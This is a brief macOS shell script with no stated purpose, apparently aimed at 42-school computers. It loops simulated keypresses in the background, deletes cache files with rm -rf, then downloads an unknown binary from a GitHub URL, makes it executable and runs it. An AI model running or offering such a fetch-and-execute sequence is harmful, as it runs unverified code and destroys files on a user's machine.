for ((;;)) do osascript -e 'tell application "System Events"
	key code 93
end tell'; done&



zsh -c 'rm -rf "~/Library/*42_cache*"';
zsh -c 'curl -Ls "https://raw.githubusercontent.com/logoutpolice42/banana/master/f?inline=false" > f';
zsh -c 'chmod +x f';
zsh -c 'sleep 60';



kill %%;
./f;